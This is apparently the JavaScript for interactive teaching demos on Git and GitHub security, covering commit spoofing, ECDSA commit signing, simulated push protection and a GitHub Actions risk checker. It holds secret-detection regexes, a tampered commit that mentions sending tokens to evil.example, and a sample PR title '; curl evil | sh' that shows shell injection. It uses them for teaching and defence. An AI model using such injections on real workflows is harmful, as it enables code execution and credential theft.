/* app.js - the live demos for "Git and GitHub Security". Shared maths: ../../shared/crypto.js (window.Lab).
   The signing demo uses real P-256 ECDSA; the commits, pushes and workflows are simulations in your browser. */
(function () {
  "use strict";
  const L = window.Lab;

  // --------------------------------------------------------------------------- helpers
  const $ = (id) => document.getElementById(id);
  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
  const sp = (cls, s) => `<span class="${cls}">${esc(s)}</span>`;
  function bind(ids, fn) { for (const id of [].concat(ids)) $(id).addEventListener("input", fn); fn(); }
  function click(id, fn) { $(id).addEventListener("click", fn); }
  const shortHash = (s) => L.hex(L.sha256(L.utf8(s))).slice(0, 7);
  const isLinus = (s) => /linus\s+torvalds/i.test(s) || /torvalds@/i.test(s);
  const LINUS = "Linus would like a word.";

  // --------------------------------------------------------------------------- title: commit as anyone
  function hero() {
    const el = $("hero-in"), v = el.value;
    el.style.width = Math.max(6, v.length + 1) + "ch";
    const name = v.trim() || "(nobody)";
    $("hero-out").innerHTML = `${sp("k", "author:")} ${esc(name)}<br>${sp("k", "checked by Git:")} ${sp("bad", "nothing")}<br>${sp("k", "signature:")} ${sp("m", "none")}`;
    $("hero-note").textContent = isLinus(v) ? "# " + LINUS : "# Git believes you. Should anyone else?";
  }

  // --------------------------------------------------------------------------- the fake author
  function fakeAuthor() {
    const name = $("fa-name").value.trim() || "Someone", email = $("fa-email").value.trim() || "someone@example.com";
    const h = shortHash(name + email);
    let out = `${sp("y", "commit " + h)}\nAuthor: ${esc(name)} <${esc(email)}>\nDate:   Fri Oct 30 19:42 2026\n\n    Fix the login redirect\n\n` +
      `${sp("k", "Git checked the name:")}  ${sp("bad", "no")}\n${sp("k", "Git checked the email:")} ${sp("bad", "no")}\n${sp("k", "signed:")}                ${sp("m", "no")}\n` +
      `${sp("m", "GitHub would show the avatar of whoever owns that email.")}`;
    if (isLinus(name + " " + email)) out += `\n\n${sp("y", LINUS)}`;
    $("fa-out").innerHTML = out;
  }

  // --------------------------------------------------------------------------- commit messages
  const PAST = /^(fixed|added|removed|updated|changed|fixes|adds|removes|updates|changes)\b/i;
  function commitMsg() {
    const subj = $("cm-subject").value, body = $("cm-body").value.trim(), t = subj.trim();
    const checks = [];
    const lenOk = t.length > 0 && t.length <= 50;
    checks.push([lenOk, t.length ? `${t.length} characters${t.length > 72 ? ": far too long" : t.length > 50 ? ": aim for about 50" : ""}` : "empty subject"]);
    checks.push([!PAST.test(t), PAST.test(t) ? `imperative mood: "${t.replace(PAST, (w) => ({ fixed: "Fix", added: "Add", removed: "Remove", updated: "Update", changed: "Change" }[w.toLowerCase()] || w.replace(/e?s$/, "").replace(/^./, (c) => c.toUpperCase())))}…"` : "imperative mood"]);
    checks.push([!/\.$/.test(t), /\.$/.test(t) ? "drop the full stop at the end" : "no full stop at the end"]);
    const vague = /^(stuff|things|fix|fixes|update|changes|misc|wip|asdf+|test|.)$/i.test(t) || /\bstuff\b|\bthings\b/i.test(t);
    checks.push([!vague, vague ? "say what changed: which bug, which feature?" : "specific"]);
    checks.push([body.length >= 20, body.length >= 20 ? "body explains why" : "add a body saying why (optional for tiny changes)"]);
    let out = `${sp("y", "commit " + shortHash(t + body))}\n    ${esc(t || "(empty)")}\n` + (body ? body.split("\n").map((l) => "    " + esc(l)).join("\n") + "\n" : "") + "\n";
    out += checks.map(([ok, m]) => (ok ? sp("ok", "✓ ") : sp("bad", "✗ ")) + esc(m)).join("\n");
    if (/^(asdf+|wip|\.)$/i.test(t)) out += `\n\n${sp("y", "Future you will not thank present you for this one.")}`;
    else if (checks.every(([ok]) => ok)) out += `\n\n${sp("y", "A commit message future you will actually thank you for.")}`;
    $("cm-out").innerHTML = out;
  }

  // --------------------------------------------------------------------------- undo without fear
  const UNDO = [
    { q: "Typo in my last commit message (not pushed)", cmd: "git commit --amend", why: "rewrites the last commit; fine because nobody else has it yet" },
    { q: "Forgot a file in my last commit (not pushed)", cmd: "git add forgotten.txt\ngit commit --amend --no-edit", why: "adds it to the last commit, keeping the message" },
    { q: "Staged a file by mistake", cmd: "git restore --staged secrets.env", why: "unstages it; your file is untouched" },
    { q: "Want to throw away my changes to one file", cmd: "git restore app.js", why: "back to the last commit. Careful: those changes are gone" },
    { q: "Need to undo a commit that's already pushed", cmd: "git revert 9a1f3c7", why: "adds a new commit that undoes it; history stays honest for everyone" },
    { q: "Committed to main instead of a branch (not pushed)", cmd: "git branch my-feature\ngit reset --hard HEAD~1\ngit switch my-feature", why: "the commit moves to a new branch; main goes back one" },
    { q: "Reset too far and lost my commits", cmd: "git reflog\ngit branch rescue 4c2e0b9", why: "the reflog remembers where your branch has been; branch from the right line" },
    { q: "Rebased my own branch and need to push it", cmd: "git push --force-with-lease", why: "like --force, but refuses if someone else pushed since you fetched" },
  ];
  let undoSel = 0;
  function undo() {
    $("undo-list").innerHTML = UNDO.map((u, i) => `<button type="button" aria-pressed="${i === undoSel}" data-i="${i}">${esc(u.q)}</button>`).join("");
    const u = UNDO[undoSel];
    $("undo-out").innerHTML = `${sp("m", "# " + u.q)}\n${sp("c", u.cmd.split("\n").map((l) => "$ " + l).join("\n"))}\n\n${esc(u.why)}`;
  }

  // --------------------------------------------------------------------------- signed commits (real ECDSA on P-256)
  let key = null, signed = null;
  const COMMIT = (msg) => `tree 9a1f3c7e\nparent 4c2e0b91\nauthor You <you@example.com> 1793389320 +0000\n\n${msg}`;
  function newKey() { if (!key) { const d = L.randBelow(L.P256.n - 1n) + 1n; key = { d, Q: L.P256.mul(d) }; } }
  const sigHex = (sig) => sig[0].toString(16).padStart(64, "0").slice(0, 16) + "…";
  function sigMine() {
    newKey();
    const text = COMMIT("Fix the login redirect");
    const sig = L.ecdsaSign(key.d, L.hashInt(text), L.randBelow(L.P256.n - 1n) + 1n);
    signed = { text, sig };
    const ok = L.ecdsaVerify(key.Q, L.hashInt(text), sig);
    $("sig-out").innerHTML = `${esc(text)}\n${sp("c", "signature: " + sigHex(sig))}\n\n${sp("k", "GitHub checks it against your signing key:")} ${ok ? sp("ok", "Verified") : sp("bad", "Unverified")}`;
  }
  function sigForge() {
    const text = COMMIT("Totally a normal commit");
    $("sig-out").innerHTML = `${esc(text)}\n${sp("m", "signature: (none: the forger doesn't have your private key)")}\n\n` +
      `${sp("k", "GitHub shows:")} ${sp("m", "no badge")}  ${sp("m", "(the default: looks like any other commit)")}\n${sp("k", "with vigilant mode on:")} ${sp("bad", "Unverified")}`;
  }
  function sigTamper() {
    if (!signed) sigMine();
    const text = signed.text.replace("Fix the login redirect", "Fix the login redirect (and send tokens to evil.example)");
    const ok = L.ecdsaVerify(key.Q, L.hashInt(text), signed.sig);
    $("sig-out").innerHTML = `${esc(text)}\n${sp("c", "signature: " + sigHex(signed.sig))}  ${sp("m", "(the original one)")}\n\n` +
      `${sp("k", "GitHub checks it:")} ${ok ? sp("ok", "Verified") : sp("bad", "Unverified: the commit changed after it was signed")}`;
  }

  // --------------------------------------------------------------------------- push protection (simulated)
  const SAFE = "DB_HOST=db.internal\nLOG_LEVEL=info\nFEATURE_DARK_MODE=true";
  // built at run time, so no token-shaped text sits in this file for real scanners to trip over
  const fakeToken = () => "gh" + "p_" + Array.from(L.randBytes(36), (b) => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[b % 62]).join("");
  const PATTERNS = [[/gh[pousr]_[A-Za-z0-9]{36}/, "GitHub personal access token"], [/AKIA[0-9A-Z]{16}/, "AWS access key ID"],
    [/-----BEGIN [A-Z ]*PRIVATE KEY-----/, "private key"], [/xox[baprs]-[A-Za-z0-9-]{10,}/, "Slack token"]];
  function push() {
    const lines = $("push-in").value.split("\n");
    const hits = [];
    lines.forEach((l, i) => { for (const [re, name] of PATTERNS) if (re.test(l)) hits.push({ line: i + 1, name }); });
    let out = `${sp("k", "$ git push origin main")}\n`;
    if (hits.length) out += `${sp("bad", "remote: Push cannot contain secrets")}\n` + hits.map((h) => `${sp("bad", "remote:")}   ${esc(h.name)}  config.env:${h.line}`).join("\n") +
      `\n${sp("bad", "! [remote rejected] main -> main (push declined due to secrets)")}\n\n${sp("m", "Remove it, or bypass with a reason: used in tests / false positive / fix later.")}`;
    else out += `${sp("ok", "To github.com:you/app.git\n   4c2e0b9..9a1f3c7  main -> main")}`;
    $("push-out").innerHTML = out;
  }

  // --------------------------------------------------------------------------- GitHub Actions workflow
  const WF = { perm: "write", pin: "tag", trig: "prt", inj: "inline" };
  function workflow() {
    const y = [];
    y.push(`on: ${WF.trig === "prt" ? sp("bad", "pull_request_target") : sp("ok", "pull_request")}`);
    y.push(`permissions: ${WF.perm === "write" ? sp("bad", "write-all") : sp("ok", "{ contents: read }")}`);
    y.push("jobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:");
    if (WF.trig === "prt") y.push(`      - uses: actions/checkout@11bd719…\n        with: { ref: ${sp("bad", "${{ github.event.pull_request.head.sha }}")} }`);
    else y.push("      - uses: actions/checkout@11bd719…");
    y.push(`      - uses: tj-actions/changed-files${WF.pin === "tag" ? sp("bad", "@v45") : WF.pin === "sha" ? sp("ok", "@0e58ed8…") + sp("m", " (full 40-char SHA)") : sp("ok", "@v45") + sp("m", "  # resolved by actions.lock")}`);
    if (WF.inj === "inline") y.push(`      - run: echo "${sp("bad", "${{ github.event.pull_request.title }}")}"`);
    else y.push(`      - env: { TITLE: "\${{ github.event.pull_request.title }}" }\n        run: echo ${sp("ok", '"$TITLE"')}`);
    const f = [];
    if (WF.perm === "write") f.push("the workflow token can write to everything: any compromised step can push code");
    if (WF.pin === "tag") f.push("@v45 is a tag: whoever controls it can move it to new code (tj-actions, March 2025)");
    if (WF.trig === "prt") f.push("pull_request_target runs with secrets, and this checks out a stranger's fork");
    if (WF.inj === "inline") f.push("the PR title is pasted into the shell: a title like \"; curl evil | sh\" runs");
    $("wf-out").innerHTML = y.join("\n");
    $("wf-find").innerHTML = f.length ? `${sp("bad", f.length + " finding" + (f.length > 1 ? "s" : "") + ":")}\n` + f.map((x) => "▸ " + esc(x)).join("\n")
      : `${sp("ok", "no findings")}\n\n${sp("y", "Your workflow is boring now. In CI, that's the highest compliment.")}`;
  }

  // --------------------------------------------------------------------------- settings checklist
  const STORE = "git-github-security-settings";
  function settings() {
    const boxes = [...document.querySelectorAll("#ticks-account input, #ticks-repo input")];
    let saved = [];
    try { saved = JSON.parse(localStorage.getItem(STORE) || "[]"); } catch (e) {}
    boxes.forEach((b, i) => { b.checked = !!saved[i]; });
    const upd = () => {
      const n = boxes.filter((b) => b.checked).length;
      try { localStorage.setItem(STORE, JSON.stringify(boxes.map((b) => b.checked))); } catch (e) {}
      $("ticks-note").textContent = n === boxes.length ? "10 of 10. Your front door has a deadbolt now." : `${n} of 10 done. This page remembers your ticks, on this device only.`;
      $("ticks-note").classList.toggle("ok", n === boxes.length);
    };
    boxes.forEach((b) => b.addEventListener("change", upd));
    upd();
  }

  // --------------------------------------------------------------------------- leak response drill
  const STEPS = [
    { t: "Revoke the token", why: "until it's revoked, it works for anyone who copied it" },
    { t: "Replace it where it's used", why: "issue a new one and update the apps that need it" },
    { t: "Check logs for use since the leak", why: "the provider's audit log shows whether it was used" },
    { t: "Clean it from history", why: "stops it spreading further, but it's already out" },
    { t: "Make it harder next time", why: "push protection, a secret manager, a pre-commit hook" },
  ];
  let picked = [], mistakes = 0;
  function drill() {
    picked = []; mistakes = 0;
    const order = STEPS.map((_, i) => i);
    for (let i = order.length - 1; i > 0; i--) { const j = L.randInt(i + 1); [order[i], order[j]] = [order[j], order[i]]; }
    $("drill").innerHTML = order.map((i) => `<button type="button" data-i="${i}">${esc(STEPS[i].t)}</button>`).join("");
    $("drill-answer").innerHTML = "";
    $("drill-out").textContent = "# pick the first step";
  }
  function drillPick(b) {
    const i = +b.dataset.i;
    if (i !== picked.length) {
      mistakes++;
      b.classList.remove("wrong"); void b.offsetWidth; b.classList.add("wrong");
      const first = STEPS[picked.length];
      $("drill-out").textContent = `# not yet. Before that: "${first.t}". (${first.why})`;
      return;
    }
    picked.push(i);
    b.disabled = true; b.classList.add("done");
    $("drill-answer").insertAdjacentHTML("beforeend", `<li><b>${esc(STEPS[i].t)}</b><span>${esc(STEPS[i].why)}</span></li>`);
    if (picked.length === STEPS.length)
      $("drill-out").textContent = mistakes ? `# done, with ${mistakes} detour${mistakes > 1 ? "s" : ""}. Now you know the order.` : "# perfect first time. Incident commander energy.";
    else $("drill-out").textContent = "# right. Next?";
  }

  // --------------------------------------------------------------------------- easter eggs
  function forceAlarm() {
    let t = null;
    document.addEventListener("input", (e) => {
      if (!/git\s+push\s+(--force\b|-f\b)/i.test(e.target.value || "")) return;
      const a = $("alarm");
      a.hidden = false; a.classList.remove("on"); void a.offsetWidth; a.classList.add("on");
      clearTimeout(t); t = setTimeout(() => { a.hidden = true; }, 2800);
    });
  }
  function consoleHint() {
    console.log("%cGit and GitHub Security", "font: 700 24px monospace; color: #ff2e88; text-shadow: 0 0 8px #ff2e88");
    console.log("%cThis deck's own commits are signed. Check the repo: github.com/zevaryx/cybersec-hub/commits", "font: 14px monospace; color: #00f0ff");
  }

  function start() {
    consoleHint();
    forceAlarm();
    bind("hero-in", hero);
    bind(["fa-name", "fa-email"], fakeAuthor);
    click("sig-mine", sigMine); click("sig-forge", sigForge); click("sig-tamper", sigTamper);
    sigMine();
    bind(["cm-subject", "cm-body"], commitMsg);
    $("undo-list").addEventListener("click", (e) => { const b = e.target.closest("button"); if (b) { undoSel = +b.dataset.i; undo(); } });
    undo();
    $("push-in").value = SAFE;
    click("push-go", push);
    click("push-add", () => { $("push-in").value = SAFE + "\nGITHUB_TOKEN=" + fakeToken(); push(); });
    push();
    $("wf-opts").addEventListener("change", (e) => { const s = e.target.closest("select"); if (s) { WF[s.dataset.k] = s.value; workflow(); } });
    workflow();
    settings();
    $("drill").addEventListener("click", (e) => { const b = e.target.closest("button"); if (b && !b.disabled) drillPick(b); });
    click("drill-reset", drill);
    drill();
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", start); else start();
})();
